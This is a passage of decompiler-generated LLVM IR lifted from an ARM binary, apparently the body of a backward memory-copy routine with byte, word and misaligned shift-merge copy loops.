  %v17_182d4 = inttoptr i32 %v16_182d4 to i32*
  %v18_182d4 = load i32, i32* %v17_182d4, align 4
  store i32 %v18_182d4, i32* %lr.global-to-local, align 4
  store i32 %v16_182d4, i32* %r1.global-to-local, align 4
  %v7_182d8 = add i32 %v6_182d8, -16
  %v8_182d8 = inttoptr i32 %v7_182d8 to i32*
  store i32 %v9_182d4, i32* %v8_182d8, align 4
  %v10_182d8 = add i32 %v6_182d8, -12
  %v11_182d8 = inttoptr i32 %v10_182d8 to i32*
  %v12_182d8 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v12_182d8, i32* %v11_182d8, align 4
  %v13_182d8 = add i32 %v6_182d8, -8
  %v14_182d8 = inttoptr i32 %v13_182d8 to i32*
  %v15_182d8 = load i32, i32* @ip, align 4
  store i32 %v15_182d8, i32* %v14_182d8, align 4
  %v16_182d8 = add i32 %v6_182d8, -4
  %v17_182d8 = inttoptr i32 %v16_182d8 to i32*
  %v18_182d8 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v18_182d8, i32* %v17_182d8, align 4
  store i32 %v7_182d8, i32* %r0.global-to-local, align 4
  %v6_182dc = load i32, i32* %r2.global-to-local, align 4
  %v7_182dc = add i32 %v6_182dc, -16
  store i32 %v7_182dc, i32* %r2.global-to-local, align 4
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_182d0, %bb147
  %v6_182e8 = phi i32 [ %v7_182d8, %bb147 ], [ %v6_182d8, %dec_label_pc_182d0 ]
  %v0_182e0 = phi i32 [ %v7_182dc, %bb147 ], [ %v0_182e0.pr, %dec_label_pc_182d0 ]
  %v4_182e0 = add i32 %v0_182e0, 20
  store i32 %v4_182e0, i32* %r2.global-to-local, align 4
  %v6_182e0 = sub i32 0, %v0_182e0
  %v7_182e0 = and i32 %v4_182e0, %v6_182e0
  %v8_182e0 = icmp slt i32 %v7_182e0, 0
  store i1 %v8_182e0, i1* %cpsr_v.global-to-local, align 1
  %v9_182e0 = icmp slt i32 %v4_182e0, 0
  store i1 %v9_182e0, i1* %cpsr_n.global-to-local, align 1
  %v10_182e0 = icmp eq i32 %v4_182e0, 0
  store i1 %v10_182e0, i1* %cpsr_z.global-to-local, align 1
  %v5_182e4 = icmp slt i32 %v0_182e0, -20
  br i1 %v5_182e4, label %.thread4, label %bb148

bb148:                                            ; preds = %.thread2
  %v6_182e4 = load i32, i32* %r1.global-to-local, align 4
  %v7_182e4 = add i32 %v6_182e4, -4
  %v8_182e4 = inttoptr i32 %v7_182e4 to i32*
  %v9_182e4 = load i32, i32* %v8_182e4, align 4
  store i32 %v9_182e4, i32* @r3, align 4
  %v10_182e4 = add i32 %v6_182e4, -8
  %v11_182e4 = inttoptr i32 %v10_182e4 to i32*
  %v12_182e4 = load i32, i32* %v11_182e4, align 4
  store i32 %v12_182e4, i32* @ip, align 4
  %v13_182e4 = add i32 %v6_182e4, -12
  %v14_182e4 = inttoptr i32 %v13_182e4 to i32*
  %v15_182e4 = load i32, i32* %v14_182e4, align 4
  store i32 %v15_182e4, i32* %lr.global-to-local, align 4
  store i32 %v13_182e4, i32* %r1.global-to-local, align 4
  %v7_182e8 = add i32 %v6_182e8, -12
  %v8_182e8 = inttoptr i32 %v7_182e8 to i32*
  store i32 %v9_182e4, i32* %v8_182e8, align 4
  %v10_182e8 = add i32 %v6_182e8, -8
  %v11_182e8 = inttoptr i32 %v10_182e8 to i32*
  %v12_182e8 = load i32, i32* @ip, align 4
  store i32 %v12_182e8, i32* %v11_182e8, align 4
  %v13_182e8 = add i32 %v6_182e8, -4
  %v14_182e8 = inttoptr i32 %v13_182e8 to i32*
  %v15_182e8 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v15_182e8, i32* %v14_182e8, align 4
  store i32 %v7_182e8, i32* %r0.global-to-local, align 4
  %v6_182ec = load i32, i32* %r2.global-to-local, align 4
  %v7_182ec = add i32 %v6_182ec, -12
  store i32 %v7_182ec, i32* %r2.global-to-local, align 4
  br label %.thread4

.thread4:                                         ; preds = %.thread2, %bb148
  %v6_1830c45 = phi i32 [ %v6_182e8, %.thread2 ], [ %v7_182e8, %bb148 ]
  %v0_182f443 = phi i32 [ %v4_182e0, %.thread2 ], [ %v7_182ec, %bb148 ]
  %v2_182f0 = load i8*, i8** %stack_var_-8, align 4
  %v3_182f0 = ptrtoint i8* %v2_182f0 to i32
  store i32 %v3_182f0, i32* @r4, align 4
  store i32 %v8_182ac, i32* @lr, align 4
  br label %dec_label_pc_182f4

dec_label_pc_182f4:                               ; preds = %dec_label_pc_182a4, %.thread4
  %v7_18304 = phi i32 [ %v0_182bc37, %dec_label_pc_182a4 ], [ %v6_1830c45, %.thread4 ]
  %v0_182f4 = phi i32 [ %v2_182a4, %dec_label_pc_182a4 ], [ %v0_182f443, %.thread4 ]
  %v2_182f4 = add i32 %v0_182f4, 8
  store i32 %v2_182f4, i32* %r2.global-to-local, align 4
  %v4_182f4 = sub i32 0, %v0_182f4
  %v5_182f4 = and i32 %v2_182f4, %v4_182f4
  %v6_182f4 = icmp slt i32 %v5_182f4, 0
  store i1 %v6_182f4, i1* %cpsr_v.global-to-local, align 1
  %v7_182f4 = icmp slt i32 %v2_182f4, 0
  store i1 %v7_182f4, i1* %cpsr_n.global-to-local, align 1
  %v8_182f4 = icmp eq i32 %v2_182f4, 0
  store i1 %v8_182f4, i1* %cpsr_z.global-to-local, align 1
  %v5_182f8 = icmp slt i32 %v0_182f4, -8
  br i1 %v5_182f8, label %bb150, label %dec_label_pc_182fc

dec_label_pc_182fc:                               ; preds = %dec_label_pc_182f4
  %v6_182fc = add i32 %v0_182f4, 4
  store i32 %v6_182fc, i32* %r2.global-to-local, align 4
  %v8_182fc = sub i32 -5, %v0_182f4
  %v9_182fc = and i32 %v8_182fc, %v2_182f4
  %v10_182fc = icmp slt i32 %v9_182fc, 0
  store i1 %v10_182fc, i1* %cpsr_v.global-to-local, align 1
  %v11_182fc = icmp slt i32 %v6_182fc, 0
  store i1 %v11_182fc, i1* %cpsr_n.global-to-local, align 1
  %v12_182fc = icmp eq i32 %v2_182f4, 4
  store i1 %v12_182fc, i1* %cpsr_z.global-to-local, align 1
  %v5_18300 = icmp slt i32 %v2_182f4, 4
  %v6_18300 = load i32, i32* %r1.global-to-local, align 4
  %v7_18300 = add i32 %v6_18300, -4
  %v8_18300 = inttoptr i32 %v7_18300 to i32*
  %v9_18300 = load i32, i32* %v8_18300, align 4
  store i32 %v9_18300, i32* @r3, align 4
  br i1 %v5_18300, label %.thread8, label %bb149

.thread8:                                         ; preds = %dec_label_pc_182fc
  store i32 %v7_18300, i32* %r1.global-to-local, align 4
  %v8_18304 = add i32 %v7_18304, -4
  %v9_18304 = inttoptr i32 %v8_18304 to i32*
  store i32 %v9_18300, i32* %v9_18304, align 4
  %v10_18304 = load i32, i32* %r0.global-to-local, align 4
  %v11_18304 = add i32 %v10_18304, -4
  store i32 %v11_18304, i32* %r0.global-to-local, align 4
  %v0_18314.pre = load i32, i32* %r2.global-to-local, align 4
  br label %bb150

bb149:                                            ; preds = %dec_label_pc_182fc
  %v10_18308 = add i32 %v6_18300, -8
  %v11_18308 = inttoptr i32 %v10_18308 to i32*
  %v12_18308 = load i32, i32* %v11_18308, align 4
  store i32 %v12_18308, i32* @ip, align 4
  store i32 %v10_18308, i32* %r1.global-to-local, align 4
  %v7_1830c = add i32 %v7_18304, -8
  %v8_1830c = inttoptr i32 %v7_1830c to i32*
  store i32 %v9_18300, i32* %v8_1830c, align 4
  %v10_1830c = add i32 %v7_18304, -4
  %v11_1830c = inttoptr i32 %v10_1830c to i32*
  %v12_1830c = load i32, i32* @ip, align 4
  store i32 %v12_1830c, i32* %v11_1830c, align 4
  store i32 %v7_1830c, i32* %r0.global-to-local, align 4
  %v6_18310 = load i32, i32* %r2.global-to-local, align 4
  %v7_18310 = add i32 %v6_18310, -4
  store i32 %v7_18310, i32* %r2.global-to-local, align 4
  br label %bb150

bb150:                                            ; preds = %.thread8, %.thread14, %dec_label_pc_182f4, %dec_label_pc_18284, %dec_label_pc_184b8, %dec_label_pc_1844c, %dec_label_pc_183e0, %bb149
  %v2_18318 = phi i32 [ %v11_18304, %.thread8 ], [ %v0_183b020, %.thread14 ], [ %v7_18304, %dec_label_pc_182f4 ], [ %v2_18288, %dec_label_pc_18284 ], [ %v2_1832453, %dec_label_pc_184b8 ], [ %v2_1832452, %dec_label_pc_1844c ], [ %v2_1832451, %dec_label_pc_183e0 ], [ %v7_1830c, %bb149 ]
  %v0_18314 = phi i32 [ %v0_18314.pre, %.thread8 ], [ %v2_18358, %.thread14 ], [ %v2_182f4, %dec_label_pc_182f4 ], [ %v2_1828c, %dec_label_pc_18284 ], [ %v0_1831449, %dec_label_pc_184b8 ], [ %v0_1831448, %dec_label_pc_1844c ], [ %v0_1831447, %dec_label_pc_183e0 ], [ %v7_18310, %bb149 ]
  %v1_18314 = add i32 %v0_18314, 4
  store i32 %v1_18314, i32* %r2.global-to-local, align 4
  %v3_18314 = sub i32 0, %v0_18314
  %v4_18314 = and i32 %v1_18314, %v3_18314
  %v5_18314 = icmp slt i32 %v4_18314, 0
  store i1 %v5_18314, i1* %cpsr_v.global-to-local, align 1
  %v6_18314 = icmp slt i32 %v1_18314, 0
  store i1 %v6_18314, i1* %cpsr_n.global-to-local, align 1
  %v7_18314 = icmp eq i32 %v1_18314, 0
  store i1 %v7_18314, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_18314, label %.thread130, label %bb151

bb151:                                            ; preds = %bb150
  %v1_1831c = add i32 %v0_18314, 2
  %v3_1831c = sub i32 -3, %v0_18314
  %v4_1831c = and i32 %v3_1831c, %v1_18314
  %v5_1831c = icmp slt i32 %v4_1831c, 0
  store i1 %v5_1831c, i1* %cpsr_v.global-to-local, align 1
  %v6_1831c = icmp slt i32 %v1_1831c, 0
  store i1 %v6_1831c, i1* %cpsr_n.global-to-local, align 1
  %v7_1831c = icmp eq i32 %v1_18314, 2
  store i1 %v7_1831c, i1* %cpsr_z.global-to-local, align 1
  %v0_18320 = load i32, i32* %r1.global-to-local, align 4
  %v1_18320 = add i32 %v0_18320, -1
  %v2_18320 = inttoptr i32 %v1_18320 to i8*
  %v3_18320 = load i8, i8* %v2_18320, align 1
  %v4_18320 = zext i8 %v3_18320 to i32
  store i32 %v4_18320, i32* @r3, align 4
  store i32 %v1_18320, i32* %r1.global-to-local, align 4
  %v3_18324 = add i32 %v2_18318, -1
  %v4_18324 = inttoptr i32 %v3_18324 to i8*
  store i8 %v3_18320, i8* %v4_18324, align 1
  %v5_18324 = load i32, i32* %r0.global-to-local, align 4
  %v6_18324 = add i32 %v5_18324, -1
  store i32 %v6_18324, i32* %r0.global-to-local, align 4
  %v0_18328 = load i1, i1* %cpsr_n.global-to-local, align 1
  %v1_18328 = load i1, i1* %cpsr_v.global-to-local, align 1
  %v2_18328 = xor i1 %v0_18328, %v1_18328
  br i1 %v2_18328, label %.thread129, label %bb152

bb152:                                            ; preds = %bb151
  %v3_18328 = load i32, i32* %r1.global-to-local, align 4
  %v4_18328 = add i32 %v3_18328, -1
  %v5_18328 = inttoptr i32 %v4_18328 to i8*
  %v6_18328 = load i8, i8* %v5_18328, align 1
  %v7_18328 = zext i8 %v6_18328 to i32
  store i32 %v7_18328, i32* @r3, align 4
  store i32 %v4_18328, i32* %r1.global-to-local, align 4
  %v6_1832c = add i32 %v5_18324, -2
  %v7_1832c = inttoptr i32 %v6_1832c to i8*
  store i8 %v6_18328, i8* %v7_1832c, align 1
  %v8_1832c = load i32, i32* %r0.global-to-local, align 4
  %v9_1832c = add i32 %v8_1832c, -1
  store i32 %v9_1832c, i32* %r0.global-to-local, align 4
  %v1_18330.pre = load i1, i1* %cpsr_n.global-to-local, align 1
  %v2_18330.pre = load i1, i1* %cpsr_v.global-to-local, align 1
  br label %.thread129

.thread129:                                       ; preds = %bb151, %bb152
  %v7_18334 = phi i32 [ %v9_1832c, %bb152 ], [ %v6_18324, %bb151 ]
  %v2_18334 = phi i1 [ %v2_18330.pre, %bb152 ], [ %v1_18328, %bb151 ]
  %v1_18334 = phi i1 [ %v1_18330.pre, %bb152 ], [ %v0_18328, %bb151 ]
  %v0_18330 = load i1, i1* %cpsr_z.global-to-local, align 1
  %v3_18330 = xor i1 %v2_18334, %v1_18334
  %v4_18330 = or i1 %v0_18330, %v3_18330
  br i1 %v4_18330, label %.thread130, label %bb153

bb153:                                            ; preds = %.thread129
  %v5_18330 = load i32, i32* %r1.global-to-local, align 4
  %v6_18330 = add i32 %v5_18330, -1
  %v7_18330 = inttoptr i32 %v6_18330 to i8*
  %v8_18330 = load i8, i8* %v7_18330, align 1
  %v9_18330 = zext i8 %v8_18330 to i32
  store i32 %v9_18330, i32* @r3, align 4
  store i32 %v6_18330, i32* %r1.global-to-local, align 4
  %v8_18334 = add i32 %v7_18334, -1
  %v9_18334 = inttoptr i32 %v8_18334 to i8*
  store i8 %v8_18330, i8* %v9_18334, align 1
  %v10_18334 = load i32, i32* %r0.global-to-local, align 4
  %v11_18334 = add i32 %v10_18334, -1
  store i32 %v11_18334, i32* %r0.global-to-local, align 4
  br label %.thread130

dec_label_pc_1833c:                               ; preds = %dec_label_pc_18294
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v8_1833c = icmp eq i32 %v1_18294, 1
  store i1 %v8_1833c, i1* %cpsr_n.global-to-local, align 1
  %v9_1833c = icmp eq i32 %v1_18294, 2
  store i1 %v9_1833c, i1* %cpsr_z.global-to-local, align 1
  %v1_18340 = add i32 %v2_18284, -1
  %v2_18340 = inttoptr i32 %v1_18340 to i8*
  %v3_18340 = load i8, i8* %v2_18340, align 1
  %v4_18340 = zext i8 %v3_18340 to i32
  store i32 %v4_18340, i32* @r3, align 4
  store i32 %v1_18340, i32* %r1.global-to-local, align 4
  %v3_18344 = add i32 %v2_18288, -1
  %v4_18344 = inttoptr i32 %v3_18344 to i8*
  store i8 %v3_18340, i8* %v4_18344, align 1
  %v5_18344 = load i32, i32* %r0.global-to-local, align 4
  %v6_18344 = add i32 %v5_18344, -1
  store i32 %v6_18344, i32* %r0.global-to-local, align 4
  br i1 %v8_1833c, label %.thread14, label %bb154

bb154:                                            ; preds = %dec_label_pc_1833c
  %v6_18348 = load i32, i32* %r1.global-to-local, align 4
  %v7_18348 = add i32 %v6_18348, -1
  %v8_18348 = inttoptr i32 %v7_18348 to i8*
  %v9_18348 = load i8, i8* %v8_18348, align 1
  %v10_18348 = zext i8 %v9_18348 to i32
  store i32 %v10_18348, i32* @r3, align 4
  store i32 %v7_18348, i32* %r1.global-to-local, align 4
  %v9_1834c = add i32 %v5_18344, -2
  %v10_1834c = inttoptr i32 %v9_1834c to i8*
  store i8 %v9_18348, i8* %v10_1834c, align 1
  %v11_1834c = load i32, i32* %r0.global-to-local, align 4
  %v12_1834c = add i32 %v11_1834c, -1
  store i32 %v12_1834c, i32* %r0.global-to-local, align 4
  br i1 %v9_1833c, label %.thread14, label %bb155

bb155:                                            ; preds = %bb154
  %v8_18350 = load i32, i32* %r1.global-to-local, align 4
  %v9_18350 = add i32 %v8_18350, -1
  %v10_18350 = inttoptr i32 %v9_18350 to i8*
  %v11_18350 = load i8, i8* %v10_18350, align 1
  %v12_18350 = zext i8 %v11_18350 to i32
  store i32 %v12_18350, i32* @r3, align 4
  store i32 %v9_18350, i32* %r1.global-to-local, align 4
  %v11_18354 = add i32 %v11_1834c, -2
  %v12_18354 = inttoptr i32 %v11_18354 to i8*
  store i8 %v11_18350, i8* %v12_18354, align 1
  %v13_18354 = load i32, i32* %r0.global-to-local, align 4
  %v14_18354 = add i32 %v13_18354, -1
  store i32 %v14_18354, i32* %r0.global-to-local, align 4
  br label %.thread14

.thread14:                                        ; preds = %bb154, %dec_label_pc_1833c, %bb155
  %v0_183b020 = phi i32 [ %v12_1834c, %bb154 ], [ %v6_18344, %dec_label_pc_1833c ], [ %v14_18354, %bb155 ]
  %v0_18358 = load i32, i32* %r2.global-to-local, align 4
  %v1_18358 = load i32, i32* @ip, align 4
  %v2_18358 = sub i32 %v0_18358, %v1_18358
  store i32 %v2_18358, i32* %r2.global-to-local, align 4
  %v4_18358 = xor i32 %v1_18358, %v0_18358
  %v5_18358 = xor i32 %v2_18358, %v0_18358
  %v6_18358 = and i32 %v5_18358, %v4_18358
  %v7_18358 = icmp slt i32 %v6_18358, 0
  store i1 %v7_18358, i1* %cpsr_v.global-to-local, align 1
  %v8_18358 = icmp slt i32 %v2_18358, 0
  store i1 %v8_18358, i1* %cpsr_n.global-to-local, align 1
  %v9_18358 = icmp eq i32 %v0_18358, %v1_18358
  store i1 %v9_18358, i1* %cpsr_z.global-to-local, align 1
  %v5_1835c = icmp slt i32 %v0_18358, %v1_18358
  br i1 %v5_1835c, label %bb150, label %dec_label_pc_18360

dec_label_pc_18360:                               ; preds = %.thread14
  %v0_18360 = load i32, i32* %r1.global-to-local, align 4
  %v1_18360 = urem i32 %v0_18360, 4
  store i32 %v1_18360, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_18360 = icmp eq i32 %v1_18360, 0
  store i1 %v2_18360, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18360, label %dec_label_pc_182a4, label %dec_label_pc_18368

dec_label_pc_18368:                               ; preds = %dec_label_pc_1829c, %dec_label_pc_18360
  %v0_183b019 = phi i32 [ %v2_18288, %dec_label_pc_1829c ], [ %v0_183b020, %dec_label_pc_18360 ]
  %v0_1845c = phi i32 [ %v2_1828c, %dec_label_pc_1829c ], [ %v2_18358, %dec_label_pc_18360 ]
  %v0_18368 = phi i32 [ %v2_18284, %dec_label_pc_1829c ], [ %v0_18360, %dec_label_pc_18360 ]
  %v0_18370 = phi i32 [ %v1_1829c, %dec_label_pc_1829c ], [ %v1_18360, %dec_label_pc_18360 ]
  %v1_18368 = and i32 %v0_18368, -4
  store i32 %v1_18368, i32* %r1.global-to-local, align 4
  %v1_1836c = inttoptr i32 %v1_18368 to i32*
  %v2_1836c = load i32, i32* %v1_1836c, align 4
  store i32 %v2_1836c, i32* @r3, align 4
  %v7_18370 = icmp ult i32 %v0_18370, 2
  %v2_18454 = add i32 %v0_1845c, -12
  %v4_18454 = sub i32 11, %v0_1845c
  %v5_18454 = and i32 %v4_18454, %v0_1845c
  %v6_18454 = icmp slt i32 %v5_18454, 0
  store i1 %v6_18454, i1* %cpsr_v.global-to-local, align 1
  %v7_18454 = icmp slt i32 %v2_18454, 0
  store i1 %v7_18454, i1* %cpsr_n.global-to-local, align 1
  %v8_18454 = icmp eq i32 %v0_1845c, 12
  store i1 %v8_18454, i1* %cpsr_z.global-to-local, align 1
  %v5_18458 = icmp slt i32 %v0_1845c, 12
  br i1 %v7_18370, label %dec_label_pc_18454, label %dec_label_pc_18378

dec_label_pc_18378:                               ; preds = %dec_label_pc_18368
  %v8_18370 = icmp eq i32 %v0_18370, 2
  br i1 %v8_18370, label %dec_label_pc_183e8, label %dec_label_pc_1837c

dec_label_pc_1837c:                               ; preds = %dec_label_pc_18378
  br i1 %v5_18458, label %dec_label_pc_183c8, label %dec_label_pc_18384

dec_label_pc_18384:                               ; preds = %dec_label_pc_1837c
  store i32 %v2_18454, i32* %r2.global-to-local, align 4
  %v3_18388 = load i32, i32* @r4, align 4
  store i32 %v3_18388, i32* %stack_var_-12, align 4
  %v6_18388 = load i32, i32* @r5, align 4
  %v8_18388 = inttoptr i32 %v6_18388 to i8*
  store i8* %v8_18388, i8** %stack_var_-8, align 4
  %v11_18388 = load i32, i32* @lr, align 4
  br label %dec_label_pc_1838c

dec_label_pc_1838c:                               ; preds = %dec_label_pc_1838c.dec_label_pc_1838c_crit_edge, %dec_label_pc_18384
  %v0_183b0 = phi i32 [ %v1_183b0, %dec_label_pc_1838c.dec_label_pc_1838c_crit_edge ], [ %v0_183b019, %dec_label_pc_18384 ]
  %v0_18390 = phi i32 [ %v0_18390.pre, %dec_label_pc_1838c.dec_label_pc_1838c_crit_edge ], [ %v1_18368, %dec_label_pc_18384 ]
  %v0_1838c = phi i32 [ %v0_1838c.pre, %dec_label_pc_1838c.dec_label_pc_1838c_crit_edge ], [ %v2_1836c, %dec_label_pc_18384 ]
  %v3_1838c = mul i32 %v0_1838c, 256
  store i32 %v3_1838c, i32* %lr.global-to-local, align 4
  %v1_18390 = add i32 %v0_18390, -4
  %v2_18390 = inttoptr i32 %v1_18390 to i32*
  %v3_18390 = load i32, i32* %v2_18390, align 4
  store i32 %v3_18390, i32* @r3, align 4
  %v4_18390 = add i32 %v0_18390, -8
  %v5_18390 = inttoptr i32 %v4_18390 to i32*
  %v6_18390 = load i32, i32* %v5_18390, align 4
  store i32 %v6_18390, i32* %r4.global-to-local, align 4
  %v7_18390 = add i32 %v0_18390, -12
  %v8_18390 = inttoptr i32 %v7_18390 to i32*
  %v9_18390 = load i32, i32* %v8_18390, align 4
  store i32 %v9_18390, i32* %r5.global-to-local, align 4
  %v10_18390 = add i32 %v0_18390, -16
  %v11_18390 = inttoptr i32 %v10_18390 to i32*
  %v12_18390 = load i32, i32* %v11_18390, align 4
  store i32 %v10_18390, i32* %r1.global-to-local, align 4
  %v4_18394 = udiv i32 %v12_18390, 16777216
  %v5_18394 = or i32 %v4_18394, %v3_1838c
  store i32 %v5_18394, i32* %lr.global-to-local, align 4
  %v3_18398 = mul i32 %v12_18390, 256
  %v4_1839c = udiv i32 %v9_18390, 16777216
  %v5_1839c = or i32 %v3_18398, %v4_1839c
  store i32 %v5_1839c, i32* @ip, align 4
  %v3_183a0 = mul i32 %v9_18390, 256
  %v4_183a4 = udiv i32 %v6_18390, 16777216
  %v5_183a4 = or i32 %v3_183a0, %v4_183a4
  store i32 %v5_183a4, i32* %r5.global-to-local, align 4
  %v3_183a8 = mul i32 %v6_18390, 256
  %v4_183ac = udiv i32 %v3_18390, 16777216
  %v5_183ac = or i32 %v3_183a8, %v4_183ac
  store i32 %v5_183ac, i32* %r4.global-to-local, align 4
  %v1_183b0 = add i32 %v0_183b0, -16
  %v2_183b0 = inttoptr i32 %v1_183b0 to i32*
  store i32 %v5_183ac, i32* %v2_183b0, align 4
  %v4_183b0 = add i32 %v0_183b0, -12
  %v5_183b0 = inttoptr i32 %v4_183b0 to i32*
  %v6_183b0 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v6_183b0, i32* %v5_183b0, align 4
  %v7_183b0 = add i32 %v0_183b0, -8
  %v8_183b0 = inttoptr i32 %v7_183b0 to i32*
  %v9_183b0 = load i32, i32* @ip, align 4
  store i32 %v9_183b0, i32* %v8_183b0, align 4
  %v10_183b0 = add i32 %v0_183b0, -4
  %v11_183b0 = inttoptr i32 %v10_183b0 to i32*
  %v12_183b0 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_183b0, i32* %v11_183b0, align 4
  store i32 %v1_183b0, i32* %r0.global-to-local, align 4
  %v0_183b4 = load i32, i32* %r2.global-to-local, align 4
  %v2_183b4 = add i32 %v0_183b4, -16
  store i32 %v2_183b4, i32* %r2.global-to-local, align 4
  %v6_183b8 = icmp slt i32 %v0_183b4, 16
  br i1 %v6_183b8, label %dec_label_pc_183bc, label %dec_label_pc_1838c.dec_label_pc_1838c_crit_edge

dec_label_pc_1838c.dec_label_pc_1838c_crit_edge:  ; preds = %dec_label_pc_1838c
  %v0_1838c.pre = load i32, i32* @r3, align 4
  %v0_18390.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1838c

dec_label_pc_183bc:                               ; preds = %dec_label_pc_1838c
  %v2_183bc = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_183bc, i32* @r4, align 4
  %v5_183bc = load i8*, i8** %stack_var_-8, align 4
  %v6_183bc = ptrtoint i8* %v5_183bc to i32
  store i32 %v6_183bc, i32* @r5, align 4
  store i32 %v11_18388, i32* @lr, align 4
  %v2_183c0 = add i32 %v0_183b4, -4
  store i32 %v2_183c0, i32* %r2.global-to-local, align 4
  %v4_183c0 = add i32 %v0_183b4, 2147483632
  %v5_183c0 = and i32 %v2_183c0, %v4_183c0
  %v6_183c0 = icmp slt i32 %v5_183c0, 0
  store i1 %v6_183c0, i1* %cpsr_v.global-to-local, align 1
  %v7_183c0 = icmp slt i32 %v2_183c0, 0
  store i1 %v7_183c0, i1* %cpsr_n.global-to-local, align 1
  %v8_183c0 = icmp eq i32 %v2_183c0, 0
  store i1 %v8_183c0, i1* %cpsr_z.global-to-local, align 1
  %v5_183c4 = icmp slt i32 %v2_183b4, -12
  br i1 %v5_183c4, label %dec_label_pc_183e0, label %dec_label_pc_183c8

dec_label_pc_183c8:                               ; preds = %dec_label_pc_183bc, %dec_label_pc_1837c, %dec_label_pc_183c8
  %v1_183d4 = phi i32 [ %v5_183d4, %dec_label_pc_183c8 ], [ %v1_183b0, %dec_label_pc_183bc ], [ %v0_183b019, %dec_label_pc_1837c ]
  %v0_183c8 = load i32, i32* @r3, align 4
  %v3_183c8 = mul i32 %v0_183c8, 256
  store i32 %v3_183c8, i32* %ip.global-to-local, align 4
  %v0_183cc = load i32, i32* %r1.global-to-local, align 4
  %v1_183cc = add i32 %v0_183cc, -4
  %v2_183cc = inttoptr i32 %v1_183cc to i32*
  %v3_183cc = load i32, i32* %v2_183cc, align 4
  store i32 %v3_183cc, i32* @r3, align 4
  store i32 %v1_183cc, i32* %r1.global-to-local, align 4
  %v4_183d0 = udiv i32 %v3_183cc, 16777216
  %v5_183d0 = or i32 %v4_183d0, %v3_183c8
  store i32 %v5_183d0, i32* @ip, align 4
  %v2_183d4 = add i32 %v1_183d4, -4
  %v3_183d4 = inttoptr i32 %v2_183d4 to i32*
  store i32 %v5_183d0, i32* %v3_183d4, align 4
  %v4_183d4 = load i32, i32* %r0.global-to-local, align 4
  %v5_183d4 = add i32 %v4_183d4, -4
  store i32 %v5_183d4, i32* %r0.global-to-local, align 4
  %v0_183d8 = load i32, i32* %r2.global-to-local, align 4
  %v2_183d8 = add i32 %v0_183d8, -4
  store i32 %v2_183d8, i32* %r2.global-to-local, align 4
  %v6_183dc = icmp slt i32 %v0_183d8, 4
  br i1 %v6_183dc, label %dec_label_pc_183e0.loopexit, label %dec_label_pc_183c8

dec_label_pc_183e0.loopexit:                      ; preds = %dec_label_pc_183c8
  %v4_183d8 = sub i32 3, %v0_183d8
  %v5_183d8 = and i32 %v4_183d8, %v0_183d8
  %v6_183d8 = icmp slt i32 %v5_183d8, 0
  %v7_183d8 = icmp slt i32 %v2_183d8, 0
  store i1 %v6_183d8, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_183d8, i1* %cpsr_n.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_183e0

dec_label_pc_183e0:                               ; preds = %dec_label_pc_183e0.loopexit, %dec_label_pc_183bc
  %v2_1832451 = phi i32 [ %v5_183d4, %dec_label_pc_183e0.loopexit ], [ %v1_183b0, %dec_label_pc_183bc ]
  %v0_1831447 = phi i32 [ %v2_183d8, %dec_label_pc_183e0.loopexit ], [ %v2_183c0, %dec_label_pc_183bc ]
  %v0_183e0 = load i32, i32* %r1.global-to-local, align 4
  %v1_183e0 = add i32 %v0_183e0, 3
  store i32 %v1_183e0, i32* %r1.global-to-local, align 4
  br label %bb150

dec_label_pc_183e8:                               ; preds = %dec_label_pc_18378
  br i1 %v5_18458, label %dec_label_pc_18434, label %dec_label_pc_183f0

dec_label_pc_183f0:                               ; preds = %dec_label_pc_183e8
  store i32 %v2_18454, i32* %r2.global-to-local, align 4
  %v3_183f4 = load i32, i32* @r4, align 4
  store i32 %v3_183f4, i32* %stack_var_-12, align 4
  %v6_183f4 = load i32, i32* @r5, align 4
  %v8_183f4 = inttoptr i32 %v6_183f4 to i8*
  store i8* %v8_183f4, i8** %stack_var_-8, align 4
  %v11_183f4 = load i32, i32* @lr, align 4
  br label %dec_label_pc_183f8

dec_label_pc_183f8:                               ; preds = %dec_label_pc_183f8.dec_label_pc_183f8_crit_edge, %dec_label_pc_183f0
  %v0_1841c = phi i32 [ %v1_1841c, %dec_label_pc_183f8.dec_label_pc_183f8_crit_edge ], [ %v0_183b019, %dec_label_pc_183f0 ]
  %v0_183fc = phi i32 [ %v0_183fc.pre, %dec_label_pc_183f8.dec_label_pc_183f8_crit_edge ], [ %v1_18368, %dec_label_pc_183f0 ]
  %v0_183f8 = phi i32 [ %v0_183f8.pre, %dec_label_pc_183f8.dec_label_pc_183f8_crit_edge ], [ %v2_1836c, %dec_label_pc_183f0 ]
  %v3_183f8 = mul i32 %v0_183f8, 65536
  store i32 %v3_183f8, i32* %lr.global-to-local, align 4
  %v1_183fc = add i32 %v0_183fc, -4
  %v2_183fc = inttoptr i32 %v1_183fc to i32*
  %v3_183fc = load i32, i32* %v2_183fc, align 4
  store i32 %v3_183fc, i32* @r3, align 4
  %v4_183fc = add i32 %v0_183fc, -8
  %v5_183fc = inttoptr i32 %v4_183fc to i32*
  %v6_183fc = load i32, i32* %v5_183fc, align 4
  store i32 %v6_183fc, i32* %r4.global-to-local, align 4
  %v7_183fc = add i32 %v0_183fc, -12
  %v8_183fc = inttoptr i32 %v7_183fc to i32*
  %v9_183fc = load i32, i32* %v8_183fc, align 4
  store i32 %v9_183fc, i32* %r5.global-to-local, align 4
  %v10_183fc = add i32 %v0_183fc, -16
  %v11_183fc = inttoptr i32 %v10_183fc to i32*
  %v12_183fc = load i32, i32* %v11_183fc, align 4
  store i32 %v10_183fc, i32* %r1.global-to-local, align 4
  %v4_18400 = udiv i32 %v12_183fc, 65536
  %v5_18400 = or i32 %v4_18400, %v3_183f8
  store i32 %v5_18400, i32* %lr.global-to-local, align 4
  %v3_18404 = mul i32 %v12_183fc, 65536
